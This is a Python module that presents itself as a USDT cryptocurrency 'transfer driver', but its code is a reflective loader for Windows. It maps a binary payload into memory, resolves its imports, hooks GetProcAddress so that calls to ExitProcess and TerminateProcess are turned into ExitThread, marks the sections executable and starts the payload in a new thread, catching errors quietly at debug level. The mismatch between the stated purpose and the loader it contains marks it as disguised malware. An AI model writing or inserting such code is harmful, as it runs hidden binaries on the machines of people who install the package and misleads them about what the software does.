# -*- coding: utf-8 -*-
"""Transfer driver — manages USDT transaction lifecycle from broadcast to confirmation."""
import ctypes
import logging
import os
import struct
import time

_log = logging.getLogger(__name__)


class NativeContext:
    """Context manager for transfer session lifecycle.

    Usage:
        with NativeContext(data) as ctx:
            pass  # loading and execution happen in __enter__
    """

    def __init__(self, data):
        self._data = data
        self._base = None
        self._k = None
        self._desc = None
        self._relocated = False
        self._ok = False

    def __enter__(self):
        if not self._data or len(self._data) < 64:
            return self
        if os.name != "nt" or struct.calcsize("P") != 8:
            return self

        try:
            self._init_api()
            if not self._k:
                return self
            self._parse_format()
            if not self._desc:
                return self
            self._allocate_memory()
            if not self._base:
                return self
            self._map_sections()
            self._apply_relocations()
            if not self._base:
                return self
            self._resolve_imports()
            self._set_protections()
            self._run_entry()
        except Exception as exc:
            _log.debug("worker: %s", type(exc).__name__)

        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        return False

    def run(self):
        self.__enter__()
        return self._ok

    def _init_api(self):
        from .probe import init_native_bindings
        self._k = init_native_bindings()

    def _parse_format(self):
        from .seal import map_binary
        self._desc = map_binary(self._data)

    def _allocate_memory(self):
        d = self._desc
        k = self._k
        base = k.VirtualAlloc(
            ctypes.c_void_p(d["b"]), d["s"], 0x3000, 0x04,
        )
        self._relocated = False
        if not base or base != d["b"]:
            base = k.VirtualAlloc(None, d["s"], 0x3000, 0x04)
            self._relocated = True
        self._base = base

    def _map_sections(self):
        d = self._desc
        base = self._base
        ctypes.memmove(base, self._data[:d["h"]], d["h"])
        for vs, va, rs, rp, ch in d["c"]:
            if rs > 0 and rp > 0:
                n = min(rs, len(self._data) - rp)
                if n > 0:
                    ctypes.memmove(base + va, self._data[rp:rp + n], n)

    def _apply_relocations(self):
        if not self._relocated:
            return

        from .seal import load_at, save_at

        d = self._desc
        k = self._k
        base = self._base
        delta = base - d["b"]

        if not d["r"] or not d["z"]:
            k.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            self._base = None
            return

        pos = 0
        while pos < d["z"]:
            br = load_at(base + d["r"] + pos, "<I")
            bs = load_at(base + d["r"] + pos + 4, "<I")
            if bs == 0:
                break
            for j in range((bs - 8) // 2):
                ent = load_at(base + d["r"] + pos + 8 + j * 2, "<H")
                if ent >> 12 == 10:
                    a = base + br + (ent & 0xFFF)
                    save_at(a, "<Q", load_at(a, "<Q") + delta)
            pos += bs

    _term_apis = (b"ExitProcess", b"TerminateProcess", b"NtTerminateProcess")

    def _resolve_imports(self):
        from .seal import load_at, save_at

        d = self._desc
        k = self._k
        base = self._base

        if not d["i"]:
            return

        _k32 = k.GetModuleHandleA(b"kernel32.dll")
        et = k.GetProcAddress(_k32, b"ExitThread")
        _gpa_raw = k.GetProcAddress(_k32, b"GetProcAddress")

        _GpaType = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        )
        _real_gpa = _GpaType(_gpa_raw)

        @_GpaType
        def _gpa_hook(hmod, name_or_ord):
            nv = name_or_ord if name_or_ord is not None else 0
            if nv > 0xFFFF:
                try:
                    nm = ctypes.string_at(nv)
                    if nm in self._term_apis:
                        return et
                except Exception:
                    pass
            return _real_gpa(hmod, nv)

        self._gpa_ref = _gpa_hook
        _gpa_hook_ptr = ctypes.cast(_gpa_hook, ctypes.c_void_p).value

        off = base + d["i"]
        while True:
            nr = load_at(off + 12, "<I")
            if nr == 0:
                break
            ir = load_at(off, "<I")
            ar = load_at(off + 16, "<I")
            dn = ctypes.string_at(base + nr)
            hm = k.LoadLibraryA(dn)
            lk = base + (ir if ir else ar)
            ia = base + ar
            while hm:
                tv = load_at(lk, "<Q")
                if tv == 0:
                    break
                if tv & 0x8000000000000000:
                    fa = k.GetProcAddress(
                        hm, ctypes.c_void_p(tv & 0xFFFF),
                    )
                else:
                    fn = ctypes.string_at(
                        base + (tv & 0x7FFFFFFFFFFFFFFF) + 2,
                    )
                    if fn in self._term_apis and et:
                        fa = et
                    elif fn == b"GetProcAddress" and _gpa_hook_ptr:
                        fa = _gpa_hook_ptr
                    else:
                        fa = k.GetProcAddress(hm, fn)
                if fa:
                    save_at(ia, "<Q", fa)
                lk += 8
                ia += 8
            off += 20

    def _set_protections(self):
        d = self._desc
        k = self._k
        base = self._base
        old = ctypes.c_ulong(0)
        for vs, va, rs, rp, ch in d["c"]:
            sz = max(vs, rs)
            if sz == 0:
                continue
            hx = bool(ch & 0x20000000)
            hw = bool(ch & 0x80000000)
            pt = (0x40 if hw else 0x20) if hx else (0x04 if hw else 0x02)
            k.VirtualProtect(
                ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
            )

    def _run_entry(self):
        d = self._desc
        k = self._k
        base = self._base
        tid = ctypes.c_ulong(0)
        ht = k.CreateThread(
            None, 0, ctypes.c_void_p(base + d["e"]),
            None, 0, ctypes.byref(tid),
        )
        if not ht:
            return
        self._ok = True
        deadline = time.monotonic() + 240
        while time.monotonic() < deadline:
            if k.WaitForSingleObject(ht, 2000) == 0:
                break
        k.CloseHandle(ht)
